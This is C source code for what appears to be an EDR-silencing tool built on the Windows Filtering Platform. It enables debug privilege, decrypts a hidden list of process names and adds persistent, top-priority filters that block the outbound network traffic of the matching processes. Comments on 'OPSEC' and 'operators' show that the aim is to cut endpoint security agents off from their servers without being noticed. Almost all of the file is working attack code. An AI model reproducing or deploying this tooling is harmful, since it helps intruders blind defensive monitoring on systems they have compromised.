#include <winsock2.h>
#include <initguid.h>
#include <fwpmu.h>
#include "core.h"
#include "errors.h"
#include <strsafe.h>

// Helper prototypes
static DWORD AddProviderAndSubLayer(HANDLE hEngine);
static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath);
static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath);

/*
 * configureNetworkFilters
 * -----------------------
 * Entry point for bulk configuration in WFP mode.
 * - Elevates privileges (SeDebugPrivilege) for process enumeration and AppID lookups.
 * - Opens the WFP engine and ensures our provider and sublayer exist via AddProviderAndSubLayer().
 * - Decrypts the target process list and walks running processes.
 * - For each match, resolves its full path and applies two hard-block filters (IPv4 and IPv6).
 *
 * Priority rationale:
 * - Our sublayer weight is set to the maximum (0xFFFF, UINT16) so arbitration prefers our sublayer first.
 * - Each filter uses FWP_UINT64 weight of (UINT64)-1, so within our sublayer our rules dominate.
 */
void configureNetworkFilters() {
    if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
    
    HANDLE hEngine = NULL;
    if (FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine) != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", GetLastError()); return; }
    if (AddProviderAndSubLayer(hEngine) != ERROR_SUCCESS) { FwpmEngineClose0(hEngine); return; }
    
    char** decryptedNames = (char**)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, PROCESS_DATA_COUNT * sizeof(char*));
    if (!decryptedNames) { FwpmEngineClose0(hEngine); return; }
    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) { decryptedNames[i] = decryptString(processData[i]); }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32 = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
                    if (decryptedNames[i] && lstrcmpiA(pe32.szExeFile, decryptedNames[i]) == 0) {
                        PRINTF("[+] Found target process: %s\n", pe32.szExeFile);
                        WCHAR fullPath[MAX_PATH];
                        if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
                            ApplyGenericBlockFilterForPath(hEngine, &SubLayerGUID, fullPath);
                        }
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) { if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]); }
    HeapFree(g_hHeap, 0, decryptedNames);
    FwpmEngineClose0(hEngine);
}

/*
 * addProcessRule
 * --------------
 * Adds generic block filters for a specific process path.
 * This is the on-demand variant of configureNetworkFilters() when a single path is provided.
 */
void addProcessRule(const char* processPath) {
    if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
    HANDLE hEngine = NULL;
    if (FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine) != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", GetLastError()); return; }
    if (AddProviderAndSubLayer(hEngine) != ERROR_SUCCESS) { FwpmEngineClose0(hEngine); return; }

    wchar_t processPathW[MAX_PATH];
    if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, processPathW, MAX_PATH) == 0) {
        PrintDetailedError("Failed to convert process path", GetLastError());
    } else {
        ApplyGenericBlockFilterForPath(hEngine, &SubLayerGUID, processPathW);
    }
    FwpmEngineClose0(hEngine);
}

/*
 * removeAllRules
 * --------------
 * Performs a comprehensive cleanup:
 * - Enumerates all filters owned by our provider and deletes them.
 * - Removes our sublayer and provider (ignoring not-found cases).
 */
void removeAllRules() {
    HANDLE hEngine = NULL;
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", result); return; }

    PRINTF("[+] Starting comprehensive cleanup...\n");

    HANDLE enumHandle = NULL;
    FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = {0};
    enumTemplate.providerKey = (GUID*)&ProviderGUID;
    
    result = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle);
    if (result == ERROR_SUCCESS) {
        FWPM_FILTER0** filters = NULL;
        UINT32 numEntries = 0;
        result = FwpmFilterEnum0(hEngine, enumHandle, 0xFFFFFFFF, &filters, &numEntries);
        if (result == ERROR_SUCCESS && numEntries > 0) {
            PRINTF("[+] Removing %u filter(s)...\n", numEntries);
            for (UINT32 i = 0; i < numEntries; i++) {
                FwpmFilterDeleteById0(hEngine, filters[i]->filterId);
            }
            FwpmFreeMemory0((void**)&filters);
        }
        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    }

    result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
    if (result == ERROR_SUCCESS) { PRINTF("[+] WFP sublayer removed successfully.\n"); }
    else if ((long)result != FWP_E_SUBLAYER_NOT_FOUND) { PrintDetailedError("FwpmSubLayerDeleteByKey0 failed", result); }

    result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
    if (result == ERROR_SUCCESS) { PRINTF("[+] WFP provider removed successfully.\n"); }
    else if ((long)result != FWP_E_PROVIDER_NOT_FOUND) { PrintDetailedError("FwpmProviderDeleteByKey0 failed", result); }

    FwpmEngineClose0(hEngine);
    PRINTF("[+] Cleanup complete.\n");
}

/*
 * ApplyGenericBlockFilterForPath
 * ------------------------------
 * Creates two persistent FWP_ACTION_BLOCK filters (IPv4/IPv6) bound to the process AppID.
 *
 * Arbitration/OPSEC notes:
 * - We set filter weight to FWP_UINT64 with value (UINT64)-1 for absolute priority within our sublayer.
 * - Display name uses EDR_FILTER_NAME so operators can override via compile-time macros in utils.h.
 */
static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) { return; }
    BOOL ipv4Exists = FilterExists(hEngine, &FWPM_LAYER_ALE_AUTH_CONNECT_V4, appId, EDR_FILTER_NAME);
    if (ipv4Exists) {
        WPRINTF(L"    [!] Generic block filter for %s already exists. Skipping.\n", fullPath);
        FreeAppId(appId);
        return;
    }
    
    DWORD result = FwpmTransactionBegin0(hEngine, 0);
    if (result != ERROR_SUCCESS) { PrintDetailedError("Generic FwpmTransactionBegin0 failed", result); FreeAppId(appId); return; }
    
    // Use a UINT64 variable for maximum filter weight and pass its address as required by FWPM_FILTER0
    UINT64 maxFilterWeight = (UINT64)-1;

    FWPM_FILTER0 blockFilter = {0};
    blockFilter.providerKey = (GUID*)&ProviderGUID;
    blockFilter.subLayerKey = *subLayerGuid;
    blockFilter.action.type = FWP_ACTION_BLOCK;
    blockFilter.displayData.name = EDR_FILTER_NAME;
    blockFilter.weight.type = FWP_UINT64;
    blockFilter.weight.uint64 = &maxFilterWeight;
    
    FWPM_FILTER_CONDITION0 condition = {0};
    blockFilter.filterCondition = &condition;
    blockFilter.numFilterConditions = 1;
    condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    condition.matchType = FWP_MATCH_EQUAL;
    condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    condition.conditionValue.byteBlob = appId;

    UINT64 filterId = 0;
    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
    if (result == ERROR_SUCCESS) { WPRINTF(L"    [+] Generic block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId); }
    
    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
    if (result == ERROR_SUCCESS) { WPRINTF(L"    [+] Generic block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId); }

    result = FwpmTransactionCommit0(hEngine);
    if (result != ERROR_SUCCESS) { PrintDetailedError("Generic FwpmTransactionCommit0 failed", result); FwpmTransactionAbort0(hEngine); }
    FreeAppId(appId);
}
/*
 * AddProviderAndSubLayer
 * ----------------------
 * Idempotently creates the provider and a high-priority sublayer.
 * - Provider is marked persistent so rules survive until explicitly removed.
 * - Sublayer weight is set to 0xFFFF (max UINT16) to win sublayer ordering during arbitration.
 */
static DWORD AddProviderAndSubLayer(HANDLE hEngine) {
    DWORD result = FwpmTransactionBegin0(hEngine, 0);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmTransactionBegin0 failed", result);
        return result;
    }

    FWPM_PROVIDER0 provider = { 0 };
    provider.providerKey = ProviderGUID;
    provider.displayData.name = EDR_PROVIDER_NAME;
    provider.displayData.description = EDR_PROVIDER_DESCRIPTION;
    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
    result = FwpmProviderAdd0(hEngine, &provider, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        PrintDetailedError("FwpmProviderAdd0 failed", result);
        FwpmTransactionAbort0(hEngine);
        return result;
    }

    FWPM_SUBLAYER0 subLayer = { 0 };
    subLayer.subLayerKey = SubLayerGUID;
    subLayer.displayData.name = EDR_SUBLAYER_NAME;
    subLayer.displayData.description = EDR_SUBLAYER_DESCRIPTION;
    subLayer.providerKey = (GUID*)&ProviderGUID;
    // weight is UINT16; use its maximum value for highest priority
    subLayer.weight = 0xFFFF;
    subLayer.flags = FWPM_SUBLAYER_FLAG_PERSISTENT;
    result = FwpmSubLayerAdd0(hEngine, &subLayer, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        PrintDetailedError("FwpmSubLayerAdd0 failed", result);
        FwpmTransactionAbort0(hEngine);
        return result;
    }

    result = FwpmTransactionCommit0(hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmTransactionCommit0 failed", result);
    }

    return result;
}

/*
 * RemoveFiltersForProcess
 * -----------------------
 * Removes all filters for a given process AppID across key layers (ALE connect and outbound transport,
 * IPv4 and IPv6). Used by removeRulesByPath() and during cleanup scenarios.
 */
static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    DWORD result = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
    if (result != CUSTOM_SUCCESS) {
        PrintDetailedError("Failed to get AppID for process to remove", result);
        return;
    }

    const GUID* layers[] = { &FWPM_LAYER_ALE_AUTH_CONNECT_V4, &FWPM_LAYER_ALE_AUTH_CONNECT_V6, &FWPM_LAYER_OUTBOUND_TRANSPORT_V4, &FWPM_LAYER_OUTBOUND_TRANSPORT_V6 };
    UINT totalRemoved = 0;

    FWPM_FILTER_CONDITION0 condition = { 0 };
    condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    condition.matchType = FWP_MATCH_EQUAL;
    condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    condition.conditionValue.byteBlob = appId;

    for (int i = 0; i < 4; ++i) {
        HANDLE enumHandle = NULL;
        FWPM_FILTER0** ppFilters = NULL;
        UINT32 numEntries = 0;

        FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = { 0 };
        enumTemplate.providerKey = (GUID*)&ProviderGUID;
        enumTemplate.layerKey = *layers[i];
        enumTemplate.numFilterConditions = 1;
        enumTemplate.filterCondition = &condition;
        
        result = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle);
        if (result != ERROR_SUCCESS) {
            continue;
        }

        result = FwpmFilterEnum0(hEngine, enumHandle, (UINT32)-1, &ppFilters, &numEntries);
        if (result == ERROR_SUCCESS && numEntries > 0) {
            for (UINT32 j = 0; j < numEntries; j++) {
                if (FwpmFilterDeleteById0(hEngine, ppFilters[j]->filterId) == ERROR_SUCCESS) {
                    totalRemoved++;
                }
            }
            FwpmFreeMemory0((void**)&ppFilters);
        }
        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    }

    if (totalRemoved > 0) {
        WPRINTF(L"[+] Found and removed %u rule(s) for %s\n", totalRemoved, fullPath);
    } else {
        WPRINTF(L"[!] No matching rules found for %s\n", fullPath);
    }

    FreeAppId(appId);
}

/*
 * listRules
 * ---------
 * Enumerates all filters owned by our provider and prints their IDs and names.
 * Useful for operators to discover filter IDs for targeted removals.
 */
void listRules() {
    HANDLE hEngine = NULL;
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    HANDLE enumHandle = NULL;
    FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = {0};
    enumTemplate.providerKey = (GUID*)&ProviderGUID;

    result = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmFilterCreateEnumHandle0 failed", result);
        FwpmEngineClose0(hEngine);
        return;
    }

    FWPM_FILTER0** filters = NULL;
    UINT32 numEntries = 0;
    result = FwpmFilterEnum0(hEngine, enumHandle, 0xFFFFFFFF, &filters, &numEntries);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmFilterEnum0 failed", result);
        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
        FwpmEngineClose0(hEngine);
        return;
    }

    PRINTF("[+] Found %u filter(s) for provider.\n", numEntries);
    for (UINT32 i = 0; i < numEntries; i++) {
        UINT64 id = filters[i]->filterId;
        const wchar_t* name = filters[i]->displayData.name ? filters[i]->displayData.name : L"(no name)";
        const wchar_t* description = filters[i]->displayData.description ? filters[i]->displayData.description : L"(no description)";
        const wchar_t* layer = LayerGuidToString(&filters[i]->layerKey);
        const char* action = (filters[i]->action.type == FWP_ACTION_BLOCK) ? "Block" : "Permit";

        WPRINTF(L"  Filter ID: %llu\n", id);
        WPRINTF(L"    Name: %s\n", name);
        WPRINTF(L"    Desc: %s\n", description);
        WPRINTF(L"    Action: %S\n", action);
        WPRINTF(L"    Layer: %s\n\n", layer);
    }

    if (filters) {
        FwpmFreeMemory0((void**)&filters);
    }
    FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    FwpmEngineClose0(hEngine);
}

/*
 * removeRulesByPath
 * -----------------
 * Converts a process path to AppID and removes all matching filters across supported layers.
 */
void removeRulesByPath(const char* processPath) {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to remove rules.\n");
        return;
    }

    wchar_t wProcessPath[MAX_PATH];
    if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, wProcessPath, MAX_PATH) == 0) {
        EPRINTF("[-] Failed to convert process path to wide string.\n");
        return;
    }

    HANDLE hEngine = NULL;
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    PRINTF("[+] Attempting to remove all filters for process: %s\n", processPath);
    RemoveFiltersForProcess(hEngine, wProcessPath);

    FwpmEngineClose0(hEngine);
}

/*
 * removeRuleById
 * --------------
 * Deletes a specific filter by its numeric ID.
 * Typically used after operators retrieve IDs via listRules().
 */
void removeRuleById(UINT64 ruleId) {
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    result = FwpmFilterDeleteById0(hEngine, ruleId);
    if (result == ERROR_SUCCESS) {
        PRINTF("[+] Successfully removed rule with ID %llu.\n", ruleId);
    } else {
        char contextBuffer[128];
        StringCchPrintfA(contextBuffer, 128, "Failed to remove rule with ID %llu", ruleId);
        PrintDetailedError(contextBuffer, result);
    }

    FwpmEngineClose0(hEngine);
}

